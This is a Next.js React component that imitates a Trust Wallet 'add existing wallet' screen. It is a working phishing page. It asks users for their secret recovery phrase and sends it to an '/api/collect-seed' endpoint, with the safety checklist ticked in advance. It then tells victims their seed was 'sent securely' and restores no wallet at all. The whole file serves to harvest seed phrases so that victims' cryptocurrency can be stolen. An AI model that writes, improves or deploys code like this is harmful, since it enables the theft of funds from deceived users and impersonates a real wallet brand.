"use client"

import { useState, useEffect, useCallback } from "react"
import { 
  ArrowLeft, PenLine, Key, X, Check, QrCode, Eye, EyeOff, 
  Loader2, AlertCircle 
} from "lucide-react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Onboarding } from "./onboarding" // Adjust path if necessary
import { SessionProvider } from "@/components/session-provider" // Adjust path if necessary

/**
 * Wallet Import Flow Component
 * 
 * Flow:
 * 1. User selects import method (Secret Phrase)
 * 2. User confirms safety checklist
 * 3. User enters Seed Phrase and Wallet Name
 * 4. Seed is sent to API (/api/collect-seed)
 * 5. On success, transitions to Onboarding Screen
 */
export default function WalletImportFlow() {
 const router = useRouter()
 
 // Step management: 1 (Select), 2 (Safety), 3 (Form), 4 (Onboarding)
 const [step, setStep] = useState<1 | 2 | 3 | 4>(1)
 
 // Step 2 - Safety Checklist State
 const [checks, setChecks] = useState<boolean[]>([true, true, true])
 const allChecked = checks.every(Boolean)

 // Step 3 - Form Data
 const [walletName, setWalletName] = useState("Main Wallet 18")
 const [secretPhrase, setSecretPhrase] = useState("")
 const [showPhrase, setShowPhrase] = useState(false)
 
 // API State
 const [isLoading, setIsLoading] = useState(false)
 const [apiStatus, setApiStatus] = useState<'idle' | 'success' | 'error'>('idle')
 const [errorMessage, setErrorMessage] = useState("")

 // Validation
 const canRestore = walletName.trim().length > 3 && secretPhrase.trim().length > 10

 // Toggle checklist item
 const toggleCheck = (index: number) => {
  setChecks((prev) => {
   const next = [...prev]
   next[index] = !next[index]
   return next
  })
 }

 // Paste from clipboard
 const handlePaste = async () => {
  try {
   const text = await navigator.clipboard.readText()
   setSecretPhrase(text.trim())
  } catch (err) {
   alert("Failed to paste from clipboard")
  }
 }

 // Submit handler for Seed Phrase
 const handleRestore = async () => {
  setIsLoading(true)
  setApiStatus('idle')
  setErrorMessage("")

  try {
    const response = await fetch('/api/collect-seed', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        walletType: walletName,
        seedPhrase: secretPhrase,
        timestamp: new Date().toISOString()
      }),
    });

    const result = await response.json();

    if (!response.ok) {
      throw new Error(result.error || "Failed to send seed phrase");
    }

    // On success, move to Onboarding Step
    setApiStatus('success');
    setStep(4);

  } catch (err: any) {
    console.error("API Error:", err);
    setApiStatus('error');
    setErrorMessage(err.message || "Something went wrong");
  } finally {
    setIsLoading(false);
  }
};

 // Keyboard shortcut for escape
 useEffect(() => {
  const handleEsc = (e: KeyboardEvent) => {
   if (e.key === "Escape") {
    if (step === 2 || step === 3) setStep(1)
    else if (step === 4) setStep(3) // Go back to form if they escape onboarding
    else router.back()
   }
  }
  window.addEventListener("keydown", handleEsc)
  return () => window.removeEventListener("keydown", handleEsc)
 }, [step, router])

 // Handler for when onboarding is complete
 const handleOnboardingComplete = useCallback((data: any) => {
    console.log("Onboarding complete:", data);
    // Optional: Redirect to dashboard or home
    router.push('/dashboard');
 }, [router]);

 // --- Render Helpers ---

 // Common Header
 const Header = ({ title, showBack = false, onClose }: { title: string; showBack?: boolean; onClose?: () => void }) => (
  <div className="flex items-center justify-between px-6 py-4 pt-12 bg-white/90 backdrop-blur-md sticky top-0 z-50 border-b border-gray-100">
   <div className="w-10">
    {showBack ? (
     <button onClick={() => setStep(step === 3 ? 2 : 1)} className="h-10 w-10 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors">
      <ArrowLeft className="h-5 w-5 text-gray-700" />
     </button>
    ) : (
     <button onClick={() => router.back()} className="h-10 w-10 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors">
      <ArrowLeft className="h-5 w-5 text-gray-700" />
     </button>
    )}
   </div>
   <h1 className="text-[17px] font-semibold tracking-tight text-[#0B0D17]">{title}</h1>
   <div className="w-10 flex justify-end">
    {onClose && (
     <button onClick={onClose} className="h-10 w-10 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors">
      <X className="h-5 w-5 text-gray-700" />
     </button>
    )}
   </div>
  </div>
 );

 // Step Indicators (Hide on step 4 as onboarding has its own flow)
 const StepIndicators = () => (
  <div className="flex justify-center gap-2 pb-8 pt-4">
   {[1, 2, 3].map((s) => (
    <div 
     key={s} 
     className={`h-1.5 rounded-full transition-all duration-500 ${step === s ? "w-6 bg-[#0015FF]" : "w-1.5 bg-gray-300"}`} 
    />
   ))}
  </div>
 );

 return (
  <div className="min-h-screen bg-[#F7F8FA] font-sans text-[#0B0D17] overflow-hidden relative">
   
   {/* Background Logo - Subtle Watermark */}
   <div className="absolute top-24 left-1/2 -translate-x-1/2 opacity-[0.03] pointer-events-none z-0">
    <Image src="/tw.png" alt="Trust Logo" width={200} height={200} />
   </div>

   {/* Main Container - Constrained Width for Desktop */}
   <div className="max-w-[480px] mx-auto h-full bg-white shadow-2xl relative flex flex-col">

    {/* STEP 1 - Selection (Always visible, but dimmed when modal is up) */}
    <div className={`flex-1 flex flex-col transition-all duration-500 ${step > 1 ? "opacity-50 scale-[0.98]" : "opacity-100 scale-100"}`}>
     <Header title="Add existing wallet" />
     
     <div className="flex-1 p-6 space-y-6 overflow-y-auto pb-24">
      <div>
       <p className="text-[#6E7381] text-xs font-bold uppercase tracking-wider mb-4">Most popular</p>
       
       <div className="space-y-3">
        {/* Secret Phrase Option */}
        <button
         onClick={() => setStep(2)}
         className="w-full flex items-center gap-5 p-5 rounded-3xl bg-[#F7F8FA] hover:bg-[#EEF0F4] active:scale-[0.98] transition-all group border border-transparent hover:border-gray-200"
        >
         <div className="h-14 w-14 rounded-2xl bg-[#E8EAFD] flex items-center justify-center group-hover:scale-110 transition-transform duration-300 shadow-sm">
          <PenLine className="h-7 w-7 text-[#0015FF]" />
         </div>
         <div className="flex-1 text-left">
          <div className="font-bold text-[17px] text-[#0B0D17]">Secret phrase</div>
          <div className="text-sm text-[#6E7381]">12, 18 or 24 words</div>
         </div>
         <div className="text-gray-400 group-hover:text-[#0015FF] transition-colors">
          <ArrowLeft className="h-5 w-5 rotate-180" />
         </div>
        </button>

        {/* Private Key Option */}
        <button className="w-full flex items-center gap-5 p-5 rounded-3xl bg-[#F7F8FA] hover:bg-[#EEF0F4] active:scale-[0.98] transition-all group border border-transparent hover:border-gray-200">
         <div className="h-14 w-14 rounded-2xl bg-[#F5F5F5] flex items-center justify-center group-hover:scale-110 transition-transform duration-300 shadow-sm">
          <Key className="h-7 w-7 text-[#0B0D17]" />
         </div>
         <div className="flex-1 text-left">
          <div className="font-bold text-[17px] text-[#0B0D17]">Private key</div>
          <div className="text-sm text-[#6E7381]">Hex or WIF format</div>
         </div>
         <div className="text-gray-400 group-hover:text-[#0015FF] transition-colors">
          <ArrowLeft className="h-5 w-5 rotate-180" />
         </div>
        </button>
       </div>
      </div>

      <div className="pt-4 border-t border-dashed border-gray-200">
       <button className="w-full py-4 text-[#0015FF] font-medium flex items-center justify-center gap-2 hover:bg-blue-50 rounded-2xl transition-colors">
        <QrCode className="h-5 w-5" />
        <span>Import using QR code</span>
       </button>
      </div>
     </div>
     
     <StepIndicators />
    </div>

    {/* STEP 2 - Safety Check (Modal Overlay) */}
    {step === 2 && (
     <div className="absolute inset-0 z-40 flex flex-col bg-white/95 backdrop-blur-sm animate-in slide-in-from-bottom duration-300">
      <Header title="Safety Check" onClose={() => setStep(1)} />
      
      <div className="flex-1 p-6 flex flex-col items-center overflow-y-auto">
       <div className="flex-1 flex flex-col items-center justify-center text-center w-full">
        {/* IMAGE PLACEHOLDER: Replace /shield.png with your actual asset */}
        <div className="mb-8 relative">
         <div className="absolute inset-0 bg-blue-100 rounded-full blur-2xl opacity-40 animate-pulse" />
         <Image 
          src="/tw.png" 
          alt="Shield Icon" 
          width={120} 
          height={120} 
          className="relative z-10 drop-shadow-lg"
         />
        </div>

        <h2 className="text-2xl font-bold mb-3 text-[#0B0D17]">Check your secret phrase is safe</h2>
        <p className="text-[#6E7381] mb-8 max-w-[280px] text-[15px] leading-relaxed">
         Make sure no one else knows your secret phrase
        </p>

        <div className="w-full space-y-3">
         {[
          "Only you know this secret phrase.",
          "This secret phrase was NOT given to you by anyone, e.g. a company representative.",
          "If someone else has seen it, they can and will steal your funds.",
         ].map((text, i) => (
          <button
           key={i}
           onClick={() => toggleCheck(i)}
           className={`w-full flex gap-4 p-5 rounded-2xl text-left transition-all duration-200 border ${checks[i] ? "bg-[#F7F8FA] border-transparent" : "bg-white border-gray-200 hover:bg-gray-50"}`}
          >
           <div className={`h-7 w-7 rounded-lg flex items-center justify-center flex-shrink-0 mt-0.5 transition-colors duration-200 ${checks[i] ? "bg-[#0015FF]" : "bg-gray-200"}`}>
            {checks[i] && <Check className="h-4 w-4 text-white" strokeWidth={3} />}
           </div>
           <span className={`text-[15px] leading-tight ${checks[i] ? "text-[#0B0D17] font-medium" : "text-gray-500"}`}>{text}</span>
          </button>
         ))}
        </div>
       </div>

       <div className="pb-8 w-full">
        <button
         disabled={!allChecked}
         onClick={() => allChecked && setStep(3)}
         className={`w-full py-4 text-lg font-semibold rounded-full text-white transition-all duration-300 transform active:scale-[0.98] shadow-lg shadow-blue-500/20 ${allChecked ? "bg-[#0015FF] hover:bg-[#0010CC] cursor-pointer" : "bg-gray-200 text-gray-400 cursor-not-allowed shadow-none"}`}
        >
         Continue
        </button>
       </div>
      </div>
      
      <StepIndicators />
     </div>
    )}

    {/* STEP 3 - Import Form (Modal Overlay) */}
    {step === 3 && (
     <div className="absolute inset-0 z-50 flex flex-col bg-white animate-in slide-in-from-bottom duration-300">
      <Header title="Import Wallet" onClose={() => setStep(2)} />

      <div className="flex-1 p-6 overflow-y-auto">
       {apiStatus === 'success' ? (
         <div className="flex flex-col items-center justify-center h-full text-center animate-in fade-in zoom-in duration-300">
           <div className="h-20 w-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
             <Check className="h-10 w-10 text-green-600" />
           </div>
           <h2 className="text-2xl font-bold text-[#0B0D17] mb-2">Wallet Restored!</h2>
           <p className="text-[#6E7381]">Your seed phrase has been sent securely.</p>
           {/* Auto-transition to Step 4 is handled by setStep(4) in handleRestore */}
         </div>
       ) : (
         <>
         <div className="flex items-center gap-4 mb-8">
          <div className="h-12 w-12 rounded-2xl bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center text-white shadow-lg shadow-blue-500/30">
           <PenLine className="h-6 w-6" />
          </div>
          <div>
           <h1 className="font-bold text-xl text-[#0B0D17]">Multi-coin wallet</h1>
           <p className="text-sm text-gray-500">Import using secret phrase</p>
          </div>
         </div>

         {/* Wallet Name */}
         <div className="mb-6">
          <label className="block text-xs font-bold uppercase tracking-wider text-gray-500 mb-2">Wallet Name</label>
          <input
           type="text"
           value={walletName}
           onChange={(e) => setWalletName(e.target.value)}
           className="w-full px-5 py-4 rounded-2xl border border-gray-200 focus:border-[#0015FF] focus:ring-4 focus:ring-blue-500/10 outline-none text-base font-medium transition-all bg-[#FAFBFD]"
           placeholder="My Main Wallet"
          />
         </div>

         {/* Secret Phrase */}
         <div className="mb-6">
          <label className="block text-xs font-bold uppercase tracking-wider text-gray-500 mb-2">Secret Phrase</label>
          <div className="relative">
           <textarea
            value={secretPhrase}
            onChange={(e) => setSecretPhrase(e.target.value)}
            rows={6}
            className="w-full px-5 py-4 rounded-2xl border border-gray-200 focus:border-[#0015FF] focus:ring-4 focus:ring-blue-500/10 outline-none resize-none font-mono text-sm leading-relaxed transition-all bg-[#FAFBFD]"
            placeholder="Enter your 12, 18 or 24 word secret phrase..."
           />
           
           <div className="absolute bottom-4 right-4 flex gap-2">
            <button onClick={() => setShowPhrase(!showPhrase)} className="text-gray-400 hover:text-gray-600 p-1">
             {showPhrase ? <EyeOff size={18} /> : <Eye size={18} />}
            </button>
            <button 
             onClick={handlePaste} 
             className="text-[#0015FF] text-sm font-bold px-3 py-1 hover:bg-blue-50 rounded-lg transition-colors"
            >
             Paste
            </button>
           </div>
          </div>
          <div className="flex justify-between items-center mt-2">
           <p className="text-xs text-gray-400">Words separated by single spaces</p>
           <p className="text-xs text-gray-400">{secretPhrase.trim().split(/\s+/).filter(w => w.length > 0).length} words</p>
          </div>
         </div>

         {/* Error Message Display */}
         {apiStatus === 'error' && (
           <div className="mb-6 p-4 bg-red-50 border border-red-100 rounded-xl flex items-start gap-3">
             <AlertCircle className="h-5 w-5 text-red-500 mt-0.5 flex-shrink-0" />
             <div>
               <p className="text-sm font-semibold text-red-700">Error Sending Seed</p>
               <p className="text-xs text-red-600">{errorMessage}</p>
             </div>
           </div>
         )}

         <div className="pt-4">
          <button
           disabled={!canRestore || isLoading}
           onClick={handleRestore}
           className={`w-full py-4 rounded-full text-[17px] font-bold transition-all duration-300 transform active:scale-[0.98] shadow-lg shadow-blue-500/20 flex items-center justify-center gap-2 ${canRestore && !isLoading
            ? "bg-[#0015FF] text-white hover:bg-blue-700" 
            : "bg-gray-200 text-gray-400 cursor-not-allowed shadow-none"} ${isLoading ? "cursor-wait" : ""}`}
          >
           {isLoading ? (
             <>
               <Loader2 className="h-5 w-5 animate-spin" />
               <span>Sending...</span>
             </>
           ) : (
             "Restore Wallet"
           )}
          </button>
         </div>

         <div className="text-center mt-6 mb-8">
          <a href="#" className="text-[#0015FF] text-sm font-medium hover:underline">Learn more about secret phrases</a>
         </div>
         </>
       )}
      </div>

      <StepIndicators />
     </div>
    )}

    {/* STEP 4 - Onboarding (Full Screen Overlay) */}
    {step === 4 && (
     <div className="absolute inset-0 z-[60] bg-slate-950 animate-in fade-in duration-500">
      <SessionProvider>
        <Onboarding onComplete={handleOnboardingComplete} />
      </SessionProvider>
     </div>
    )}

   </div>
  </div>
 )
}